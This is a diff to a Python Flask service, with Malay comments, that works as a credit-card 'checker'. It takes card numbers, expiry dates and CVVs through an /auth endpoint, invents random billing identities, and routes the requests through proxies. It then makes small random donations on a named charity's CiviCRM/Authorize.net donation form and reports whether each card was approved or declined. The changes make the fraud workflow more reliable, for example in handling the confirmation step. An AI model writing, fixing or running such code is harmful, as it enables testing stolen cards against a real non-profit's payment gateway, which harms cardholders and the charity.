@@ -1,5 +1,4 @@
 from flask import Flask, request, jsonify
-from datetime import datetime
 import random
 import requests
 import logging
@@ -95,11 +94,9 @@ def create_session(proxy_url=None):
         if not proxy_url.startswith('http'):
             proxy_url = f'http://{proxy_url}'
         session.proxies = {"http": proxy_url, "https": proxy_url}
-       
     return session
 
 def detect_payment_processor(html):
-    processors = {'authorize': ['authorize.net', 'authorize', 'paymentech', 'cybersource']}
     for pattern in [r'authorize\.net', r'Authorize\.Net', r'authorizenet']:
         if re.search(pattern, html, re.I): 
             return ['authorize']
@@ -161,8 +158,8 @@ def get_form_action_and_payload(session, url, proxy_url):
             return None, None, None, None, "Form not found"
 
         form_action = form.get('action') or re.search(r'<form[^>]*action="([^"]+)"', html)
-        form_action = form_action.group(1) if isinstance(form_action, re.Match) else form_action
-        if form_action and not form_action.startswith('http'):
+        form_action = form_action.group(1) if hasattr(form_action, 'group') else form_action
+        if form_action and not str(form_action).startswith('http'):
             form_action = urljoin(url, form_action)
 
         payload = extract_raw_fields(html, soup, form)
@@ -176,7 +173,6 @@ def parse_response(html, url):
     if '_qf_ThankYou_display=true' in url or '_qf_ThankYou_display=1' in url:
         return {'approved': True, 'message': 'Payment complete', 'clean_response': 'Payment complete'}
     
-    # ... (kekalkan parse_response asal kau)
     status_divs = soup.find_all('div', class_=re.compile(r'status|alert|error|messages|crm-error', re.I))
     for status_div in status_divs:
         error_text = status_div.get_text(separator=' ', strip=True)
@@ -196,25 +192,33 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amoun
     if is_confirm:
         final_payload["qfKey"] = new_qfkey if new_qfkey else qfkey
         final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
+        final_payload["email_work"] = ""
         final_payload["_qf_default"] = "Confirm:next"
-        final_payload["_qf_Confirm_next"] = "1"
         final_payload["custom_1"] = full_year
         final_payload["custom_3"] = ""
+        final_payload["_qf_Confirm_next"] = "1"
     else:
         final_payload["qfKey"] = qfkey
         final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&id=1"
         final_payload["hidden_processor"] = "1"
         final_payload["payment_processor_id"] = "4"
         final_payload["priceSetId"] = "3"
+        final_payload["selectProduct"] = ""
         final_payload["_qf_default"] = "Main:upload"
+        final_payload["zip_billing"] = ""
+        final_payload["MAX_FILE_SIZE"] = "536870912"
         final_payload["price_2"] = "10"
         final_payload["email-5"] = user_data['email']
+        final_payload["custom_1"] = full_year
+        final_payload["custom_2"] = ""
+        final_payload["custom_3"] = ""
         final_payload["credit_card_type"] = scheme
         final_payload["credit_card_number"] = ccnum
         final_payload["cvv2"] = cvv
         final_payload["credit_card_exp_date[M]"] = str(input_month)
         final_payload["credit_card_exp_date[Y]"] = full_year
         final_payload["billing_first_name"] = user_data['first_name']
+        final_payload["billing_middle_name"] = ""
         final_payload["billing_last_name"] = user_data['last_name']
         final_payload["billing_street_address-5"] = user_data['street_address']
         final_payload["billing_city-5"] = user_data['city']
@@ -225,20 +229,23 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amoun
         submit_name = raw_payload.get('_submit_button_name', '_qf_Main_upload')
         submit_val = raw_payload.get('_submit_button_value', '1')
         final_payload[submit_name] = submit_val
-
     return final_payload
 
 def process_site_for_payload(url, override_proxy=None):
-    session = create_session(override_proxy)
-    qfkey, form_action, payload, has_authorize, err_msg = get_form_action_and_payload(session, url, override_proxy)
+    proxy_url = override_proxy if override_proxy else None
+    session = create_session(proxy_url)
+    qfkey, form_action, payload, has_authorize, err_msg = get_form_action_and_payload(session, url, proxy_url)
    
     if err_msg != "OK":
         session.close()
         return {'url': url, 'status': err_msg.lower().replace(' ', '_'), 'payload': None, 'session': None, 'proxy_url': None}
    
-    return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': override_proxy}
+    if not qfkey or not form_action:
+        session.close()
+        return {'url': url, 'status': 'failed', 'payload': None, 'session': None, 'proxy_url': None}
+   
+    return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': proxy_url}
 
-# ================== CONFIRMATION HANDLING ==================
 def extract_confirmation_form(html, soup):
     confirm_form = soup.find('form', {'id': 'Confirm'})
     if not confirm_form:
@@ -250,17 +257,15 @@ def extract_confirmation_form(html, soup):
         return None, None, None
     
     new_qfkey_input = confirm_form.find('input', {'name': 'qfKey'})
-    new_qfkey = new_qfkey_input['value'] if new_qfkey_input else None
+    new_qfkey = new_qfkey_input.get('value') if new_qfkey_input else None
     action = confirm_form.get('action')
     return confirm_form, action, new_qfkey
 
 def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
-    base_url = site_data['url']
-    raw_payload = site_data['payload']
-    form_action = site_data['form_action']
-    qfkey = site_data['qfkey']
-    
+    base_url, raw_payload, form_action, qfkey = site_data['url'], site_data['payload'], site_data['form_action'], site_data['qfkey']
     session = create_session(site_data.get('proxy_url'))
+   
+    ccnum = clean_card_number(ccnum)
     user_data = generate_random_user_data()
     detected_price = round(random.uniform(1.05, 5.00), 2)
 
@@ -275,67 +280,86 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
 
             post_url = form_action
             if 'qfKey=' not in post_url:
-                post_url += ('&' if '?' in post_url else '?') + f'qfKey={qfkey}'
+                if '?' in post_url: 
+                    post_url += f'&qfKey={qfkey}'
+                else: 
+                    post_url += f'?qfKey={qfkey}'
 
-            response = session.post(post_url, data=clean_initial, timeout=TIMEOUT_SECONDS + 5, allow_redirects=True)
+            response = session.post(post_url, data=clean_initial, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
             soup_resp = BeautifulSoup(response.text, 'html.parser')
-
+           
             logging.info(f"URL Selepas Submit Pertama: {response.url}")
 
-            # Extract Confirm Form
             confirm_form, confirm_action, new_qfkey = extract_confirmation_form(response.text, soup_resp)
-
+           
             if confirm_form:
-                confirm_post_url = urljoin("https://www.saharaaa.org/civicrm/contribute/transact/", confirm_action) if confirm_action else response.url
+                confirm_post_url = form_action
+                if confirm_action:
+                    confirm_post_url = urljoin("https://www.saharaaa.org/civicrm/contribute/transact/", confirm_action)
                 
-                # Build payload dari confirm form
+                if '?' in confirm_post_url:
+                    if '_qf_Confirm_display=true' not in confirm_post_url:
+                        confirm_post_url += '&_qf_Confirm_display=true'
+                else:
+                    confirm_post_url += '?_qf_Confirm_display=true'
+                
+                if new_qfkey:
+                    confirm_post_url = re.sub(r'qfKey=[a-zA-Z0-9]+', f'qfKey={new_qfkey}', confirm_post_url)
+
+                session.headers.update({"Referer": response.url})
                 clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=True, new_qfkey=new_qfkey)
-                
+               
                 # Tambah hidden fields dari confirm form
                 for inp in confirm_form.find_all('input'):
                     name = inp.get('name')
                     if name and name not in clean_confirm:
                         clean_confirm[name] = inp.get('value', '')
 
-                session.headers.update({"Referer": response.url})
-                confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 5, allow_redirects=True)
-                
+                confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
+               
                 logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
                 result = parse_response(confirm_response.text, confirm_response.url)
             else:
+                logging.info("Confirm Form tak jumpa!")
                 result = parse_response(response.text, response.url)
-
+           
             if 'session has expired' in result.get('message', '').lower() and attempt < 2:
                 time.sleep(1)
                 continue
 
+            if session: session.close()
             return result, detected_price
-
+           
         except Exception as e:
-            logging.error(str(e))
+            if session: session.close()
             return {'approved': False, 'message': str(e)}, detected_price
 
-    return {'approved': False, 'message': 'Max retry reached'}, detected_price
+    if session: session.close()
+    return {'approved': False, 'message': 'Max retry'}, detected_price
 
 @app.route('/auth', methods=['GET'])
 def handle_auth():
     start_time = time.time()
    
     site = request.args.get('site')
+    id_param = request.args.get('id')
+    if site and id_param and 'id=' not in site:
+        site = f"{site}&id={id_param}"
     cc_param = request.args.get('cc')
     proxy_param = request.args.get('proxy')
 
     if not site or not cc_param:
-        return jsonify({"error": "Missing parameters"}), 400
+        return jsonify({"error": "Missing 'site' or 'cc' parameter"}), 400
 
     try:
         parts = cc_param.split('|')
+        if len(parts) != 4:
+            return jsonify({"error": "Invalid 'cc' format"}), 400
         cc, mm, yy, cvv = parts
-    except:
-        return jsonify({"error": "Invalid cc format"}), 400
+    except Exception as e:
+        return jsonify({"error": "Error parsing 'cc' parameter"}), 400
 
     override_proxy = proxy_param
-
     try:
         site_data = process_site_for_payload(site, override_proxy)
        
@@ -354,8 +378,8 @@ def handle_auth():
     return jsonify({
         "Gateway": "Authorized.net",
         "Price": detected_price,
-        "Result": "Approved" if result.get('approved') else "Declined",
-        "Response": result.get('message', 'Unknown'),
+        "Result": "Approved" if result.get('approved', False) else "Declined",
+        "Response": result.get('message', 'Unknown Error'),
         "Status": result.get('approved', False),
         "Time": f"{time_taken}s",
         "cc": cc_param
